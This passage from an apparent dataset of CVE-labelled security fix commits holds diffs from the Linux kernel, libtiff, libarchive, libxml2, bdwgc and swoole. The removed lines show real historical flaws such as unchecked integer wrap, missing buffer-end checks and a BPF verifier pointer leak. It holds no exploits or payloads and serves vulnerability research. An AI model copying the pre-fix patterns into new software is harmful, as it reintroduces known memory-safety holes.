0;\n+\t\trfc.monitor_timeout = 0;\n+\t\trfc.max_pdu_size    = cpu_to_le16(L2CAP_DEFAULT_MAX_RX_APDU);\n+\n+\t\tl2cap_add_conf_opt(&ptr, L2CAP_CONF_RFC,\n+\t\t\t\t\tsizeof(rfc), (unsigned long) &rfc);\n+\t\tbreak;\n+\n+\tcase L2CAP_MODE_STREAMING:\n+\t\trfc.mode            = L2CAP_MODE_STREAMING;\n+\t\trfc.txwin_size      = 0;\n+\t\trfc.max_transmit    = 0;\n+\t\trfc.retrans_timeout = 0;\n+\t\trfc.monitor_timeout = 0;\n \t\trfc.max_pdu_size    = cpu_to_le16(L2CAP_DEFAULT_MAX_RX_APDU);\n \n \t\tl2cap_add_conf_opt(&ptr, L2CAP_CONF_RFC,\n@@ -1825,30 +1889,83 @@ static int l2cap_parse_conf_req(struct sock *sk, void *data)\n \t\t}\n \t}\n \n+\tif (pi->num_conf_rsp || pi->num_conf_req)\n+\t\tgoto done;\n+\n+\tswitch (pi->mode) {\n+\tcase L2CAP_MODE_STREAMING:\n+\tcase L2CAP_MODE_ERTM:\n+\t\tpi->conf_state |= L2CAP_CONF_STATE2_DEVICE;\n+\t\tif (!l2cap_mode_supported(pi->mode, pi->conn->feat_mask))\n+\t\t\treturn -ECONNREFUSED;\n+\t\tbreak;\n+\tdefault:\n+\t\tpi->mode = l2cap_select_mode(rfc.mode, pi->conn->feat_mask);\n+\t\tbreak;\n+\t}\n+\n+done:\n+\tif (pi->mode != rfc.mode) {\n+\t\tresult = L2CAP_CONF_UNACCEPT;\n+\t\trfc.mode = pi->mode;\n+\n+\t\tif (pi->num_conf_rsp == 1)\n+\t\t\treturn -ECONNREFUSED;\n+\n+\t\tl2cap_add_conf_opt(&ptr, L2CAP_CONF_RFC,\n+\t\t\t\t\tsizeof(rfc), (unsigned long) &rfc);\n+\t}\n+\n+\n \tif (result == L2CAP_CONF_SUCCESS) {\n \t\t/* Configure output options and let the other side know\n \t\t * which ones we don't like. */\n \n-\t\tif (rfc.mode == L2CAP_MODE_BASIC) {\n-\t\t\tif (mtu < pi->omtu)\n-\t\t\t\tresult = L2CAP_CONF_UNACCEPT;\n-\t\t\telse {\n-\t\t\t\tpi->omtu = mtu;\n-\t\t\t\tpi->conf_state |= L2CAP_CONF_OUTPUT_DONE;\n-\t\t\t}\n+\t\tif (mtu < L2CAP_DEFAULT_MIN_MTU)\n+\t\t\tresult = L2CAP_CONF_UNACCEPT;\n+\t\telse {\n+\t\t\tpi->omtu = mtu;\n+\t\t\tpi->conf_state |= L2CAP_CONF_MTU_DONE;\n+\t\t}\n+\t\tl2cap_add_conf_opt(&ptr, L2CAP_CONF_MTU, 2, pi->omtu);\n \n-\t\t\tl2cap_add_conf_opt(&ptr, L2CAP_CONF_MTU, 2, pi->omtu);\n-\t\t} else {\n+\t\tswitch (rfc.mode) {\n+\t\tcase L2CAP_MODE_BASIC:\n+\t\t\tpi->fcs = L2CAP_FCS_NONE;\n+\t\t\tpi->conf_state |= L2CAP_CONF_MODE_DONE;\n+\t\t\tbreak;\n+\n+\t\tcase L2CAP_MODE_ERTM:\n+\t\t\tpi->remote_tx_win = rfc.txwin_size;\n+\t\t\tpi->remote_max_tx = rfc.max_transmit;\n+\t\t\tpi->max_pdu_size = rfc.max_pdu_size;\n+\n+\t\t\trfc.retrans_timeout = L2CAP_DEFAULT_RETRANS_TO;\n+\t\t\trfc.monitor_timeout = L2CAP_DEFAULT_MONITOR_TO;\n+\n+\t\t\tpi->conf_state |= L2CAP_CONF_MODE_DONE;\n+\t\t\tbreak;\n+\n+\t\tcase L2CAP_MODE_STREAMING:\n+\t\t\tpi->remote_tx_win = rfc.txwin_size;\n+\t\t\tpi->max_pdu_size = rfc.max_pdu_size;\n+\n+\t\t\tpi->conf_state |= L2CAP_CONF_MODE_DONE;\n+\t\t\tbreak;\n+\n+\t\tdefault:\n \t\t\tresult = L2CAP_CONF_UNACCEPT;\n \n \t\t\tmemset(&rfc, 0, sizeof(rfc));\n-\t\t\trfc.mode = L2CAP_MODE_BASIC;\n+\t\t\trfc.mode = pi->mode;\n+\t\t}\n \n-\t\t\tl2cap_add_conf_opt(&ptr, L2CAP_CONF_RFC,\n+\t\tl2cap_add_conf_opt(&ptr, L2CAP_CONF_RFC,\n \t\t\t\t\tsizeof(rfc), (unsigned long) &rfc);\n-\t\t}\n-\t}\n \n+\t\tif (result == L2CAP_CONF_SUCCESS)\n+\t\t\tpi->conf_state |= L2CAP_CONF_OUTPUT_DONE;\n+\t}\n \trsp->scid   = cpu_to_le16(pi->dcid);\n \trsp->result = cpu_to_le16(result);\n \trsp->flags  = cpu_to_le16(0x0000);\n@@ -1856,6 +1973,73 @@ static int l2cap_parse_conf_req(struct sock *sk, void *data)\n \treturn ptr - data;\n }\n \n+static int l2cap_parse_conf_rsp(struct sock *sk, void *rsp, int len, void *data, u16 *result)\n+{\n+\tstruct l2cap_pinfo *pi = l2cap_pi(sk);\n+\tstruct l2cap_conf_req *req = data;\n+\tvoid *ptr = req->data;\n+\tint type, olen;\n+\tunsigned long val;\n+\tstruct l2cap_conf_rfc rfc;\n+\n+\tBT_DBG(\"sk %p, rsp %p, len %d, req %p\", sk, rsp, len, data);\n+\n+\twhile (len >= L2CAP_CONF_OPT_SIZE) {\n+\t\tlen -= l2cap_get_conf_opt(&rsp, &type, &olen, &val);\n+\n+\t\tswitch (type) {\n+\t\tcase L2CAP_CONF_MTU:\n+\t\t\tif (val < L2CAP_DEFAULT_MIN_MTU) {\n+\t\t\t\t*result = L2CAP_CONF_UNACCEPT;\n+\t\t\t\tpi->omtu = L2CAP_DEFAULT_MIN_MTU;\n+\t\t\t} else\n+\t\t\t\tpi->omtu = val;\n+\t\t\tl2cap_add_conf_opt(&ptr, L2CAP_CONF_MTU, 2, pi->omtu);\n+\t\t\tbreak;\n+\n+\t\tcase L2CAP_CONF_FLUSH_TO:\n+\t\t\tpi->flush_to = val;\n+\t\t\tl2cap_add_conf_opt(&ptr, L2CAP_CONF_FLUSH_TO,\n+\t\t\t\t\t\t\t2, pi->flush_to);\n+\t\t\tbreak;\n+\n+\t\tcase L2CAP_CONF_RFC:\n+\t\t\tif (olen == sizeof(rfc))\n+\t\t\t\tmemcpy(&rfc, (void *)val, olen);\n+\n+\t\t\tif ((pi->conf_state & L2CAP_CONF_STATE2_DEVICE) &&\n+\t\t\t\t\t\t\trfc.mode != pi->mode)\n+\t\t\t\treturn -ECONNREFUSED;\n+\n+\t\t\tpi->mode = rfc.mode;\n+\t\t\tpi->fcs = 0;\n+\n+\t\t\tl2cap_add_conf_opt(&ptr, L2CAP_CONF_RFC,\n+\t\t\t\t\tsizeof(rfc), (unsigned long) &rfc);\n+\t\t\tbreak;\n+\t\t}\n+\t}\n+\n+\tif (*result == L2CAP_CONF_SUCCESS) {\n+\t\tswitch (rfc.mode) {\n+\t\tcase L2CAP_MODE_ERTM:\n+\t\t\tpi->remote_tx_win   = rfc.txwin_size;\n+\t\t\tpi->retrans_timeout = rfc.retrans_timeout;\n+\t\t\tpi->monitor_timeout = rfc.monitor_timeout;\n+\t\t\tpi->max_pdu_size    = le16_to_cpu(rfc.max_pdu_size);\n+\t\t\tbreak;\n+\t\tcase L2CAP_MODE_STREAMING:\n+\t\t\tpi->max_pdu_size    = le16_to_cpu(rfc.max_pdu_size);\n+\t\t\tbreak;\n+\t\t}\n+\t}\n+\n+\treq->dcid   = cpu_to_le16(pi->dcid);\n+\treq->flags  = cpu_to_le16(0x0000);\n+\n+\treturn ptr - data;\n+}\n+\n static int l2cap_build_conf_rsp(struct sock *sk, void *data, u16 result, u16 flags)\n {\n \tstruct l2cap_conf_rsp *rsp = data;\n@@ -2042,6 +2226,7 @@ static inline int l2cap_connect_rsp(struct l2cap_conn *conn, struct l2cap_cmd_hd\n \n \t\tl2cap_send_cmd(conn, l2cap_get_ident(conn), L2CAP_CONF_REQ,\n \t\t\t\t\tl2cap_build_conf_req(sk, req), req);\n+\t\tl2cap_pi(sk)->num_conf_req++;\n \t\tbreak;\n \n \tcase L2CAP_CR_PEND:\n@@ -2100,10 +2285,17 @@ static inline int l2cap_config_req(struct l2cap_conn *conn, struct l2cap_cmd_hdr\n \n \t/* Complete config. */\n \tlen = l2cap_parse_conf_req(sk, rsp);\n-\tif (len < 0)\n+\tif (len < 0) {\n+\t\tstruct l2cap_disconn_req req;\n+\t\treq.dcid = cpu_to_le16(l2cap_pi(sk)->dcid);\n+\t\treq.scid = cpu_to_le16(l2cap_pi(sk)->scid);\n+\t\tl2cap_send_cmd(conn, l2cap_get_ident(conn),\n+\t\t\t\t\tL2CAP_DISCONN_REQ, sizeof(req), &req);\n \t\tgoto unlock;\n+\t}\n \n \tl2cap_send_cmd(conn, cmd->ident, L2CAP_CONF_RSP, len, rsp);\n+\tl2cap_pi(sk)->num_conf_rsp++;\n \n \t/* Reset config buffer. */\n \tl2cap_pi(sk)->conf_len = 0;\n@@ -2121,6 +2313,7 @@ static inline int l2cap_config_req(struct l2cap_conn *conn, struct l2cap_cmd_hdr\n \t\tu8 buf[64];\n \t\tl2cap_send_cmd(conn, l2cap_get_ident(conn), L2CAP_CONF_REQ,\n \t\t\t\t\tl2cap_build_conf_req(sk, buf), buf);\n+\t\tl2cap_pi(sk)->num_conf_req++;\n \t}\n \n unlock:\n@@ -2150,16 +2343,29 @@ static inline int l2cap_config_rsp(struct l2cap_conn *conn, struct l2cap_cmd_hdr\n \t\tbreak;\n \n \tcase L2CAP_CONF_UNACCEPT:\n-\t\tif (++l2cap_pi(sk)->conf_retry < L2CAP_CONF_MAX_RETRIES) {\n-\t\t\tchar req[128];\n-\t\t\t/* It does not make sense to adjust L2CAP parameters\n-\t\t\t * that are currently defined in the spec. We simply\n-\t\t\t * resend config request that we sent earlier. It is\n-\t\t\t * stupid, but it helps qualification testing which\n-\t\t\t * expects at least some response from us. */\n-\t\t\tl2cap_send_cmd(conn, l2cap_get_ident(conn), L2CAP_CONF_REQ,\n-\t\t\t\t\t\tl2cap_build_conf_req(sk, req), req);\n-\t\t\tgoto done;\n+\t\tif (l2cap_pi(sk)->num_conf_rsp <= L2CAP_CONF_MAX_CONF_RSP) {\n+\t\t\tint len = cmd->len - sizeof(*rsp);\n+\t\t\tchar req[64];\n+\n+\t\t\t/* throw out any old stored conf requests */\n+\t\t\tresult = L2CAP_CONF_SUCCESS;\n+\t\t\tlen = l2cap_parse_conf_rsp(sk, rsp->data,\n+\t\t\t\t\t\t\tlen, req, &result);\n+\t\t\tif (len < 0) {\n+\t\t\t\tstruct l2cap_disconn_req req;\n+\t\t\t\treq.dcid = cpu_to_le16(l2cap_pi(sk)->dcid);\n+\t\t\t\treq.scid = cpu_to_le16(l2cap_pi(sk)->scid);\n+\t\t\t\tl2cap_send_cmd(conn, l2cap_get_ident(conn),\n+\t\t\t\t\tL2CAP_DISCONN_REQ, sizeof(req), &req);\n+\t\t\t\tgoto done;\n+\t\t\t}\n+\n+\t\t\tl2cap_send_cmd(conn, l2cap_get_ident(conn),\n+\t\t\t\t\t\tL2CAP_CONF_REQ, len, req);\n+\t\t\tl2cap_pi(sk)->num_conf_req++;\n+\t\t\tif (result != L2CAP_CONF_SUCCESS)\n+\t\t\t\tgoto done;\n+\t\t\tbreak;\n \t\t}\n \n \tdefault:\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2016-9535", "CWE_ID": "119", "category": "security", "commit_id": "6a984bf7905c6621281588431f384e79d11a2e33", "commit_message": "From 6a984bf7905c6621281588431f384e79d11a2e33 Mon Sep 17 00:00:00 2001\nFrom: erouault <erouault>\nDate: Fri, 4 Nov 2016 09:19:13 +0000\nSubject: [PATCH] * libtiff/tif_predic.c: fix memory leaks in error code paths\n added in previous commit (fix for MSVR 35105)\n\n---\n ChangeLog             | 5 +++++\n libtiff/tif_predict.c | 8 ++++++--\n 2 files changed, 11 insertions(+), 2 deletions(-)\n\n", "diff_code": "diff --git a/ChangeLog b/ChangeLog\nindex 0379c3b7..48fb75d3 100644\n--- a/ChangeLog\n+++ b/ChangeLog\n@@ -1,3 +1,8 @@\n+2016-11-04 Even Rouault <even.rouault at spatialys.com>\n+\n+\t* libtiff/tif_predic.c: fix memory leaks in error code paths added in\n+\tprevious commit (fix for MSVR 35105)\n+\n 2016-10-31 Even Rouault <even.rouault at spatialys.com>\n \n \t* libtiff/tif_predict.h, libtiff/tif_predict.c:\ndiff --git a/libtiff/tif_predict.c b/libtiff/tif_predict.c\nindex b829259a..3f42f3b3 100644\n--- a/libtiff/tif_predict.c\n+++ b/libtiff/tif_predict.c\n@@ -409,7 +409,7 @@ fpAcc(TIFF* tif, uint8* cp0, tmsize_t cc)\n \ttmsize_t wc = cc / bps;\n \ttmsize_t count = cc;\n \tuint8 *cp = (uint8 *) cp0;\n-\tuint8 *tmp = (uint8 *)_TIFFmalloc(cc);\n+\tuint8 *tmp;\n \n     if(cc%(bps*stride)!=0)\n     {\n@@ -418,6 +418,7 @@ fpAcc(TIFF* tif, uint8* cp0, tmsize_t cc)\n         return 0;\n     }\n \n+    tmp = (uint8 *)_TIFFmalloc(cc);\n \tif (!tmp)\n \t\treturn 0;\n \n@@ -640,7 +641,7 @@ fpDiff(TIFF* tif, uint8* cp0, tmsize_t cc)\n \ttmsize_t wc = cc / bps;\n \ttmsize_t count;\n \tuint8 *cp = (uint8 *) cp0;\n-\tuint8 *tmp = (uint8 *)_TIFFmalloc(cc);\n+\tuint8 *tmp;\n \n     if((cc%(bps*stride))!=0)\n     {\n@@ -648,6 +649,8 @@ fpDiff(TIFF* tif, uint8* cp0, tmsize_t cc)\n                      \"%s\", \"(cc%(bps*stride))!=0\");\n         return 0;\n     }\n+\n+    tmp = (uint8 *)_TIFFmalloc(cc);\n \tif (!tmp)\n \t\treturn 0;\n \n@@ -722,6 +725,7 @@ PredictorEncodeTile(TIFF* tif, uint8* bp0, tmsize_t cc0, uint16 s)\n     {\n         TIFFErrorExt(tif->tif_clientdata, \"PredictorEncodeTile\",\n                      \"%s\", \"(cc0%rowsize)!=0\");\n+        _TIFFfree( working_copy );\n         return 0;\n     }\n \twhile (cc > 0) {\n", "owner": "vadz", "repo": "libtiff", "source": "cve"}
{"CVE_ID": "CVE-2017-17855", "CWE_ID": "119", "category": "security", "commit_id": "179d1c5602997fef5a940c6ddcf31212cbfebd14", "commit_message": "From 179d1c5602997fef5a940c6ddcf31212cbfebd14 Mon Sep 17 00:00:00 2001\nFrom: Jann Horn <jannh@google.com>\nDate: Mon, 18 Dec 2017 20:11:59 -0800\nSubject: [PATCH] bpf: don't prune branches when a scalar is replaced with a\n pointer\n\nThis could be made safe by passing through a reference to env and checking\nfor env->allow_ptr_leaks, but it would only work one way and is probably\nnot worth the hassle - not doing it will not directly lead to program\nrejection.\n\nFixes: f1174f77b50c (\"bpf/verifier: rework value tracking\")\nSigned-off-by: Jann Horn <jannh@google.com>\nSigned-off-by: Alexei Starovoitov <ast@kernel.org>\nSigned-off-by: Daniel Borkmann <daniel@iogearbox.net>\n---\n kernel/bpf/verifier.c | 15 +++++++--------\n 1 file changed, 7 insertions(+), 8 deletions(-)\n\n", "diff_code": "diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c\nindex 102c519836f61..982bd9ec721ae 100644\n--- a/kernel/bpf/verifier.c\n+++ b/kernel/bpf/verifier.c\n@@ -3467,15 +3467,14 @@ static bool regsafe(struct bpf_reg_state *rold, struct bpf_reg_state *rcur,\n \t\t\treturn range_within(rold, rcur) &&\n \t\t\t       tnum_in(rold->var_off, rcur->var_off);\n \t\t} else {\n-\t\t\t/* if we knew anything about the old value, we're not\n-\t\t\t * equal, because we can't know anything about the\n-\t\t\t * scalar value of the pointer in the new value.\n+\t\t\t/* We're trying to use a pointer in place of a scalar.\n+\t\t\t * Even if the scalar was unbounded, this could lead to\n+\t\t\t * pointer leaks because scalars are allowed to leak\n+\t\t\t * while pointers are not. We could make this safe in\n+\t\t\t * special cases if root is calling us, but it's\n+\t\t\t * probably not worth the hassle.\n \t\t\t */\n-\t\t\treturn rold->umin_value == 0 &&\n-\t\t\t       rold->umax_value == U64_MAX &&\n-\t\t\t       rold->smin_value == S64_MIN &&\n-\t\t\t       rold->smax_value == S64_MAX &&\n-\t\t\t       tnum_is_unknown(rold->var_off);\n+\t\t\treturn false;\n \t\t}\n \tcase PTR_TO_MAP_VALUE:\n \t\t/* If the new min/max/var_off satisfy the old ones and\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2017-14166", "CWE_ID": "125", "category": "security", "commit_id": "fa7438a0ff4033e4741c807394a9af6207940d71", "commit_message": "From fa7438a0ff4033e4741c807394a9af6207940d71 Mon Sep 17 00:00:00 2001\nFrom: Joerg Sonnenberger <joerg@bec.de>\nDate: Tue, 5 Sep 2017 18:12:19 +0200\nSubject: [PATCH] Do something sensible for empty strings to make fuzzers\n happy.\n\n---\n libarchive/archive_read_support_format_xar.c | 8 +++++++-\n 1 file changed, 7 insertions(+), 1 deletion(-)\n\n", "diff_code": "diff --git a/libarchive/archive_read_support_format_xar.c b/libarchive/archive_read_support_format_xar.c\nindex 7a22beb9d..93eeacc5e 100644\n--- a/libarchive/archive_read_support_format_xar.c\n+++ b/libarchive/archive_read_support_format_xar.c\n@@ -1040,6 +1040,9 @@ atol10(const char *p, size_t char_cnt)\n \tuint64_t l;\n \tint digit;\n \n+\tif (char_cnt == 0)\n+\t\treturn (0);\n+\n \tl = 0;\n \tdigit = *p - '0';\n \twhile (digit >= 0 && digit < 10  && char_cnt-- > 0) {\n@@ -1054,7 +1057,10 @@ atol8(const char *p, size_t char_cnt)\n {\n \tint64_t l;\n \tint digit;\n-        \n+\n+\tif (char_cnt == 0)\n+\t\treturn (0);\n+\n \tl = 0;\n \twhile (char_cnt-- > 0) {\n \t\tif (*p >= '0' && *p <= '7')\n", "owner": "libarchive", "repo": "libarchive", "source": "cve"}
{"CVE_ID": "CVE-2011-2022", "CWE_ID": "189", "category": "security", "commit_id": "194b3da873fd334ef183806db751473512af29ce", "commit_message": "From 194b3da873fd334ef183806db751473512af29ce Mon Sep 17 00:00:00 2001\nFrom: Vasiliy Kulikov <segoon@openwall.com>\nDate: Thu, 14 Apr 2011 20:55:16 +0400\nSubject: agp: fix arbitrary kernel memory writes\n\npg_start is copied from userspace on AGPIOC_BIND and AGPIOC_UNBIND ioctl\ncmds of agp_ioctl() and passed to agpioc_bind_wrap().  As said in the\ncomment, (pg_start + mem->page_count) may wrap in case of AGPIOC_BIND,\nand it is not checked at all in case of AGPIOC_UNBIND.  As a result, user\nwith sufficient privileges (usually \"video\" group) may generate either\nlocal DoS or privilege escalation.\n\nSigned-off-by: Vasiliy Kulikov <segoon@openwall.com>\nSigned-off-by: Dave Airlie <airlied@redhat.com>\n---\n drivers/char/agp/generic.c | 11 ++++++++---\n 1 file changed, 8 insertions(+), 3 deletions(-)\n\n", "diff_code": "diff --git a/drivers/char/agp/generic.c b/drivers/char/agp/generic.c\nindex 850a643ad694..b072648dc3f6 100644\n--- a/drivers/char/agp/generic.c\n+++ b/drivers/char/agp/generic.c\n@@ -1095,8 +1095,8 @@ int agp_generic_insert_memory(struct agp_memory * mem, off_t pg_start, int type)\n \t\treturn -EINVAL;\n \t}\n \n-\t/* AK: could wrap */\n-\tif ((pg_start + mem->page_count) > num_entries)\n+\tif (((pg_start + mem->page_count) > num_entries) ||\n+\t    ((pg_start + mem->page_count) < pg_start))\n \t\treturn -EINVAL;\n \n \tj = pg_start;\n@@ -1130,7 +1130,7 @@ int agp_generic_remove_memory(struct agp_memory *mem, off_t pg_start, int type)\n {\n \tsize_t i;\n \tstruct agp_bridge_data *bridge;\n-\tint mask_type;\n+\tint mask_type, num_entries;\n \n \tbridge = mem->bridge;\n \tif (!bridge)\n@@ -1142,6 +1142,11 @@ int agp_generic_remove_memory(struct agp_memory *mem, off_t pg_start, int type)\n \tif (type != mem->type)\n \t\treturn -EINVAL;\n \n+\tnum_entries = agp_num_entries();\n+\tif (((pg_start + mem->page_count) > num_entries) ||\n+\t    ((pg_start + mem->page_count) < pg_start))\n+\t\treturn -EINVAL;\n+\n \tmask_type = bridge->driver->agp_type_to_mask_type(bridge, type);\n \tif (mask_type != 0) {\n \t\t/* The generic routines know nothing of memory types */\n-- \ncgit 1.2-0.3.lf.el7\n\n", "owner": "mjg59", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2015-8241", "CWE_ID": "119", "category": "security", "commit_id": "ab2b9a93ff19cedde7befbf2fcc48c6e352b6cbe", "commit_message": "From ab2b9a93ff19cedde7befbf2fcc48c6e352b6cbe Mon Sep 17 00:00:00 2001\nFrom: Hugh Davenport <hugh@allthethings.co.nz>\nDate: Tue, 3 Nov 2015 20:40:49 +0800\nSubject: [PATCH] Avoid extra processing of MarkupDecl when EOF\n\nFor https://bugzilla.gnome.org/show_bug.cgi?id=756263\n\nOne place where ctxt->instate == XML_PARSER_EOF whic was set up\nby entity detection issues doesn't get noticed, and even overrided\n---\n parser.c | 8 ++++++++\n 1 file changed, 8 insertions(+)\n\n", "diff_code": "diff --git a/parser.c b/parser.c\nindex d67b3003..134afe70 100644\n--- a/parser.c\n+++ b/parser.c\n@@ -6972,6 +6972,14 @@ xmlParseMarkupDecl(xmlParserCtxtPtr ctxt) {\n \t    xmlParsePI(ctxt);\n \t}\n     }\n+\n+    /*\n+     * detect requirement to exit there and act accordingly\n+     * and avoid having instate overriden later on\n+     */\n+    if (ctxt->instate == XML_PARSER_EOF)\n+        return;\n+\n     /*\n      * This is only for internal subset. On external entities,\n      * the replacement is done before parsing stage\n-- \n2.21.0\n\n", "owner": "GNOME", "repo": "libxml2", "source": "cve"}
{"CVE_ID": "CVE-2012-2673", "CWE_ID": "189", "category": "security", "commit_id": "83231d0ab5ed60015797c3d1ad9056295ac3b2bb", "commit_message": "From 83231d0ab5ed60015797c3d1ad9056295ac3b2bb Mon Sep 17 00:00:00 2001\nFrom: Hans Boehm <Hans.Boehm@hp.com>\nDate: Thu, 15 Mar 2012 21:09:05 +0400\nSubject: [PATCH] Speedup calloc size overflow check by preventing division if\n small values\n\n* malloc.c (GC_SQRT_SIZE_MAX): New macro.\n* malloc.c (calloc): Add fast initial size overflow check to avoid\ninteger division for reasonably small values passed.\n---\n malloc.c | 5 ++++-\n 1 file changed, 4 insertions(+), 1 deletion(-)\n\n", "diff_code": "diff --git a/malloc.c b/malloc.c\nindex cb49a5cf..c9b9eb6a 100644\n--- a/malloc.c\n+++ b/malloc.c\n@@ -381,9 +381,12 @@ void * malloc(size_t lb)\n # define GC_SIZE_MAX (~(size_t)0)\n #endif\n \n+#define GC_SQRT_SIZE_MAX ((1U << (WORDSZ / 2)) - 1)\n+\n void * calloc(size_t n, size_t lb)\n {\n-    if (lb && n > GC_SIZE_MAX / lb)\n+    if ((lb | n) > GC_SQRT_SIZE_MAX /* fast initial test */\n+        && lb && n > GC_SIZE_MAX / lb)\n       return NULL;\n #   if defined(GC_LINUX_THREADS) /* && !defined(USE_PROC_FOR_LIBRARIES) */\n         /* libpthread allocated some memory that is only pointed to by  */\n", "owner": "ivmai", "repo": "bdwgc", "source": "cve"}
{"CVE_ID": "CVE-2018-15503", "CWE_ID": "502", "category": "security", "commit_id": "4cdbce5d9bf2fe596bb6acd7d6611f9e8c253a76", "commit_message": "From 4cdbce5d9bf2fe596bb6acd7d6611f9e8c253a76 Mon Sep 17 00:00:00 2001\nFrom: GXhua <393323503@qq.com>\nDate: Wed, 15 Aug 2018 19:21:06 +0800\nSubject: [PATCH] add buffer end check\n\n---\n swoole_serialize.c | 164 ++++++++++++++++++++++++---------------------\n 1 file changed, 87 insertions(+), 77 deletions(-)\n\n", "diff_code": "diff --git a/swoole_serialize.c b/swoole_serialize.c\nindex fe187d069..a08e25088 100644\n--- a/swoole_serialize.c\n+++ b/swoole_serialize.c\n@@ -52,8 +52,10 @@ zend_class_entry swoole_serialize_ce;\n zend_class_entry *swoole_serialize_class_entry_ptr;\n \n #define SWOOLE_SERI_EOF \"EOF\"\n+#define CHECK_STEP if(buffer>unseri_buffer_end){ php_error_docref(NULL TSRMLS_CC, E_ERROR, \"illegal unserialize data\"); return NULL;}\n \n static struct _swSeriaG swSeriaG;\n+char *unseri_buffer_end = NULL;\n \n void swoole_serialize_init(int module_number TSRMLS_DC)\n {\n@@ -113,6 +115,7 @@ static CPINLINE void swoole_check_size(seriaString *str, size_t len)\n     }\n }\n #ifdef __SSE2__\n+\n void CPINLINE swoole_mini_memcpy(void *dst, const void *src, size_t len)\n {\n     register unsigned char *dd = (unsigned char*) dst + len;\n@@ -120,69 +123,69 @@ void CPINLINE swoole_mini_memcpy(void *dst, const void *src, size_t len)\n     switch (len)\n     {\n         case 68: *((int*) (dd - 68)) = *((int*) (ss - 68));\n-        /* no break */\n+            /* no break */\n         case 64: *((int*) (dd - 64)) = *((int*) (ss - 64));\n-        /* no break */\n+            /* no break */\n         case 60: *((int*) (dd - 60)) = *((int*) (ss - 60));\n-        /* no break */\n+            /* no break */\n         case 56: *((int*) (dd - 56)) = *((int*) (ss - 56));\n-        /* no break */\n+            /* no break */\n         case 52: *((int*) (dd - 52)) = *((int*) (ss - 52));\n-        /* no break */\n+            /* no break */\n         case 48: *((int*) (dd - 48)) = *((int*) (ss - 48));\n-        /* no break */\n+            /* no break */\n         case 44: *((int*) (dd - 44)) = *((int*) (ss - 44));\n-        /* no break */\n+            /* no break */\n         case 40: *((int*) (dd - 40)) = *((int*) (ss - 40));\n-        /* no break */\n+            /* no break */\n         case 36: *((int*) (dd - 36)) = *((int*) (ss - 36));\n-        /* no break */\n+            /* no break */\n         case 32: *((int*) (dd - 32)) = *((int*) (ss - 32));\n-        /* no break */\n+            /* no break */\n         case 28: *((int*) (dd - 28)) = *((int*) (ss - 28));\n-        /* no break */\n+            /* no break */\n         case 24: *((int*) (dd - 24)) = *((int*) (ss - 24));\n-        /* no break */\n+            /* no break */\n         case 20: *((int*) (dd - 20)) = *((int*) (ss - 20));\n-        /* no break */\n+            /* no break */\n         case 16: *((int*) (dd - 16)) = *((int*) (ss - 16));\n-        /* no break */\n+            /* no break */\n         case 12: *((int*) (dd - 12)) = *((int*) (ss - 12));\n-        /* no break */\n+            /* no break */\n         case 8: *((int*) (dd - 8)) = *((int*) (ss - 8));\n-        /* no break */\n+            /* no break */\n         case 4: *((int*) (dd - 4)) = *((int*) (ss - 4));\n             break;\n         case 67: *((int*) (dd - 67)) = *((int*) (ss - 67));\n-        /* no break */\n+            /* no break */\n         case 63: *((int*) (dd - 63)) = *((int*) (ss - 63));\n-        /* no break */\n+            /* no break */\n         case 59: *((int*) (dd - 59)) = *((int*) (ss - 59));\n-        /* no break */\n+            /* no break */\n         case 55: *((int*) (dd - 55)) = *((int*) (ss - 55));\n-        /* no break */\n+            /* no break */\n         case 51: *((int*) (dd - 51)) = *((int*) (ss - 51));\n-        /* no break */\n+            /* no break */\n         case 47: *((int*) (dd - 47)) = *((int*) (ss - 47));\n-        /* no break */\n+            /* no break */\n         case 43: *((int*) (dd - 43)) = *((int*) (ss - 43));\n-        /* no break */\n+            /* no break */\n         case 39: *((int*) (dd - 39)) = *((int*) (ss - 39));\n-        /* no break */\n+            /* no break */\n         case 35: *((int*) (dd - 35)) = *((int*) (ss - 35));\n-        /* no break */\n+            /* no break */\n         case 31: *((int*) (dd - 31)) = *((int*) (ss - 31));\n-        /* no break */\n+            /* no break */\n         case 27: *((int*) (dd - 27)) = *((int*) (ss - 27));\n-        /* no break */\n+            /* no break */\n         case 23: *((int*) (dd - 23)) = *((int*) (ss - 23));\n-        /* no break */\n+            /* no break */\n         case 19: *((int*) (dd - 19)) = *((int*) (ss - 19));\n-        /* no break */\n+            /* no break */\n         case 15: *((int*) (dd - 15)) = *((int*) (ss - 15));\n-        /* no break */\n+            /* no break */\n         case 11: *((int*) (dd - 11)) = *((int*) (ss - 11));\n-        /* no break */\n+            /* no break */\n         case 7: *((int*) (dd - 7)) = *((int*) (ss - 7));\n             *((int*) (dd - 4)) = *((int*) (ss - 4));\n             break;\n@@ -190,71 +193,71 @@ void CPINLINE swoole_mini_memcpy(void *dst, const void *src, size_t len)\n             dd[-1] = ss[-1];\n             break;\n         case 66: *((int*) (dd - 66)) = *((int*) (ss - 66));\n-        /* no break */\n+            /* no break */\n         case 62: *((int*) (dd - 62)) = *((int*) (ss - 62));\n-        /* no break */\n+            /* no break */\n         case 58: *((int*) (dd - 58)) = *((int*) (ss - 58));\n-        /* no break */\n+            /* no break */\n         case 54: *((int*) (dd - 54)) = *((int*) (ss - 54));\n-        /* no break */\n+            /* no break */\n         case 50: *((int*) (dd - 50)) = *((int*) (ss - 50));\n-        /* no break */\n+            /* no break */\n         case 46: *((int*) (dd - 46)) = *((int*) (ss - 46));\n-        /* no break */\n+            /* no break */\n         case 42: *((int*) (dd - 42)) = *((int*) (ss - 42));\n-        /* no break */\n+            /* no break */\n         case 38: *((int*) (dd - 38)) = *((int*) (ss - 38));\n-        /* no break */\n+            /* no break */\n         case 34: *((int*) (dd - 34)) = *((int*) (ss - 34));\n-        /* no break */\n+            /* no break */\n         case 30: *((int*) (dd - 30)) = *((int*) (ss - 30));\n-        /* no break */\n+            /* no break */\n         case 26: *((int*) (dd - 26)) = *((int*) (ss - 26));\n-        /* no break */\n+            /* no break */\n         case 22: *((int*) (dd - 22)) = *((int*) (ss - 22));\n-        /* no break */\n+            /* no break */\n         case 18: *((int*) (dd - 18)) = *((int*) (ss - 18));\n-        /* no break */\n+            /* no break */\n         case 14: *((int*) (dd - 14)) = *((int*) (ss - 14));\n-        /* no break */\n+            /* no break */\n         case 10: *((int*) (dd - 10)) = *((int*) 